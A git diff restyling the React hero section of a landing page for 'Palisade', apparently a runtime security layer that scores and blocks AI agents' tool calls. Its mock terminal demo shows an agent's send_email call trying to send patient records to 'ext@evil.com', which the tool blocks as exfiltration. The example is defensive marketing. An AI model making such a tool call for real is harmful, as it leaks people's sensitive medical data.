@@ -4,119 +4,113 @@ import { motion } from "framer-motion";
 
 export function Hero() {
   return (
-    <section className="relative min-h-screen flex items-center justify-center overflow-hidden">
-      {/* Background effects */}
-      <div className="absolute inset-0 bg-grid" />
-      <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-[800px] h-[600px] rounded-full bg-accent/5 blur-[120px]" />
-      <div className="absolute bottom-1/4 left-1/3 w-[400px] h-[400px] rounded-full bg-accent-secondary/5 blur-[100px]" />
-
-      <div className="relative z-10 mx-auto max-w-5xl px-6 text-center pt-32 pb-20">
+    <section className="relative pt-36 pb-24 px-6">
+      <div className="mx-auto max-w-3xl text-center">
         {/* Badge */}
         <motion.div
-          initial={{ opacity: 0, y: 20 }}
+          initial={{ opacity: 0, y: 16 }}
           animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.6, delay: 0.1 }}
-          className="mb-8 inline-flex items-center gap-2 rounded-full glass px-4 py-2 text-xs font-medium text-[#9ca3af]"
+          transition={{ duration: 0.5, delay: 0.05 }}
         >
-          <span className="flex h-2 w-2 rounded-full bg-accent animate-pulse" />
-          Now with OpenClaw integration
+          <span className="inline-flex items-center gap-2 rounded-full border border-[#e5e5e5] bg-[#fafafa] px-3.5 py-1 text-[12px] font-medium text-[#737373]">
+            <span className="h-1.5 w-1.5 rounded-full bg-[#16a34a] animate-pulse" />
+            Now with OpenClaw integration
+          </span>
         </motion.div>
 
         {/* Headline */}
         <motion.h1
-          initial={{ opacity: 0, y: 30 }}
+          initial={{ opacity: 0, y: 24 }}
           animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.8, delay: 0.2, ease: [0.21, 0.47, 0.32, 0.98] }}
-          className="text-5xl sm:text-7xl font-bold tracking-tight leading-[1.1] mb-6"
+          transition={{ duration: 0.6, delay: 0.12, ease: [0.25, 0.1, 0.25, 1] }}
+          className="mt-7 text-[clamp(2.25rem,5vw,3.5rem)] font-semibold leading-[1.1] tracking-tight text-[#0a0a0a]"
         >
-          <span className="text-gradient">Runtime intelligence</span>
+          Runtime intelligence
           <br />
-          <span className="text-white">for AI agents</span>
+          for AI agents
         </motion.h1>
 
-        {/* Subheadline */}
+        {/* Sub */}
         <motion.p
-          initial={{ opacity: 0, y: 20 }}
+          initial={{ opacity: 0, y: 16 }}
           animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.7, delay: 0.4 }}
-          className="mx-auto max-w-2xl text-lg sm:text-xl text-[#9ca3af] leading-relaxed mb-10"
+          transition={{ duration: 0.5, delay: 0.22 }}
+          className="mt-5 text-[17px] leading-relaxed text-[#737373] max-w-xl mx-auto"
         >
-          The security layer between AI agents and the real world.
-          Risk-scored decisions, exfiltration pattern detection, and a
-          real-time visual audit trail &mdash; for every tool call.
+          The security layer between AI agents and the real world. Risk-scored
+          decisions, exfiltration detection, and a real-time audit trail for
+          every tool call.
         </motion.p>
 
         {/* CTAs */}
         <motion.div
-          initial={{ opacity: 0, y: 20 }}
+          initial={{ opacity: 0, y: 12 }}
           animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.6, delay: 0.6 }}
-          className="flex flex-col sm:flex-row items-center justify-center gap-4"
+          transition={{ duration: 0.5, delay: 0.32 }}
+          className="mt-9 flex items-center justify-center gap-3"
         >
           <a
             href="#waitlist"
-            className="group relative rounded-full bg-accent px-8 py-3.5 text-sm font-semibold text-black hover:bg-accent/90 transition-all shadow-lg shadow-accent/20 hover:shadow-accent/30"
+            className="rounded-full bg-[#0a0a0a] px-6 py-2.5 text-[14px] font-medium text-white transition-opacity hover:opacity-80"
           >
             Get Early Access
           </a>
           <a
             href="#docs"
-            className="rounded-full glass px-8 py-3.5 text-sm font-medium text-[#d1d5db] hover:text-white hover:bg-white/5 transition-all"
+            className="rounded-full border border-[#e5e5e5] bg-white px-6 py-2.5 text-[14px] font-medium text-[#0a0a0a] transition-colors hover:bg-[#fafafa]"
           >
-            Read the Docs
+            Documentation
           </a>
         </motion.div>
+      </div>
 
-        {/* Terminal preview */}
-        <motion.div
-          initial={{ opacity: 0, y: 40, scale: 0.97 }}
-          animate={{ opacity: 1, y: 0, scale: 1 }}
-          transition={{ duration: 0.9, delay: 0.8, ease: [0.21, 0.47, 0.32, 0.98] }}
-          className="mt-16 mx-auto max-w-2xl"
-        >
-          <div className="glass-card p-1 glow-green">
-            <div className="rounded-[20px] overflow-hidden">
-              {/* Title bar */}
-              <div className="flex items-center gap-2 px-4 py-3 bg-black/40 border-b border-white/5">
-                <div className="flex gap-1.5">
-                  <div className="w-3 h-3 rounded-full bg-[#ff5f57]" />
-                  <div className="w-3 h-3 rounded-full bg-[#febc2e]" />
-                  <div className="w-3 h-3 rounded-full bg-[#28c840]" />
-                </div>
-                <span className="ml-2 text-xs text-[#6b7280] font-mono">
-                  palisade &mdash; policy evaluation
+      {/* Terminal */}
+      <motion.div
+        initial={{ opacity: 0, y: 32 }}
+        animate={{ opacity: 1, y: 0 }}
+        transition={{ duration: 0.7, delay: 0.45, ease: [0.25, 0.1, 0.25, 1] }}
+        className="mx-auto mt-16 max-w-2xl"
+      >
+        <div className="overflow-hidden rounded-xl border border-[#e5e5e5] shadow-sm">
+          {/* Title bar */}
+          <div className="flex items-center gap-2 border-b border-[#e5e5e5] bg-[#fafafa] px-4 py-2.5">
+            <div className="flex gap-1.5">
+              <span className="h-3 w-3 rounded-full bg-[#ff5f57]" />
+              <span className="h-3 w-3 rounded-full bg-[#febc2e]" />
+              <span className="h-3 w-3 rounded-full bg-[#28c840]" />
+            </div>
+            <span className="ml-2 text-[11px] font-mono text-[#a3a3a3]">
+              palisade &mdash; policy evaluation
+            </span>
+          </div>
+          {/* Content */}
+          <div className="bg-white p-5 font-mono text-[13px] leading-[1.7] text-left space-y-1.5">
+            <p className="text-[#a3a3a3]"># Agent tries to exfiltrate medical data</p>
+            <p>
+              <span className="text-[#16a34a]">$</span>{" "}
+              <span className="text-[#0a0a0a]">palisade evaluate</span>{" "}
+              <span className="text-[#737373]">--tool send_email</span>
+            </p>
+            <p className="text-[#a3a3a3] pl-4">
+              {`--args '{"to":"ext@evil.com","body":"<patient_records>"}'`}
+            </p>
+            <div className="mt-3 rounded-lg border border-[#fee2e2] bg-[#fef2f2] px-4 py-3 space-y-1">
+              <p className="flex items-center gap-2">
+                <span className="inline-flex h-5 items-center rounded bg-[#dc2626] px-1.5 text-[11px] font-semibold text-white">
+                  BLOCK
                 </span>
-              </div>
-              {/* Content */}
-              <div className="p-5 bg-black/30 font-mono text-[13px] leading-relaxed text-left space-y-2">
-                <div className="text-[#6b7280]"># External agent calls Palisade before each tool</div>
-                <div>
-                  <span className="text-accent">$</span>{" "}
-                  <span className="text-[#d1d5db]">curl</span>{" "}
-                  <span className="text-[#9ca3af]">-X POST</span>{" "}
-                  <span className="text-accent-secondary">localhost:8787/api/sessions/abc/evaluate</span>
-                </div>
-                <div className="text-[#9ca3af] pl-4">
-                  {`  -d '{"toolName":"send_email","toolArgs":{"to":"ext@evil.com","body":"<medical_data>"}}'`}
-                </div>
-                <div className="mt-3 text-[#6b7280]"># Palisade response:</div>
-                <div className="pl-4 space-y-1">
-                  <div>
-                    <span className="text-[#ef4444]">BLOCK</span>{" "}
-                    <span className="text-[#6b7280]">|</span>{" "}
-                    <span className="text-[#fbbf24]">risk: 60</span>{" "}
-                    <span className="text-[#6b7280]">|</span>{" "}
-                    <span className="text-[#9ca3af]">data exfiltration: sensitive + external</span>
-                  </div>
-                  <div className="text-[#6b7280] text-xs">
-                    Rules: touchesSensitiveData(30) + affectsExternalSystem(30)
-                  </div>
-                </div>
-              </div>
+                <span className="text-[#0a0a0a]">risk score: 60</span>
+              </p>
+              <p className="text-[#737373] text-[12px]">
+                Data exfiltration: sensitive data (medical) + external system (send_email)
+              </p>
+              <p className="text-[#a3a3a3] text-[11px]">
+                Rules: touchesSensitiveData(30) + affectsExternalSystem(30)
+              </p>
             </div>
           </div>
-        </motion.div>
-      </div>
+        </div>
+      </motion.div>
     </section>
   );
 }
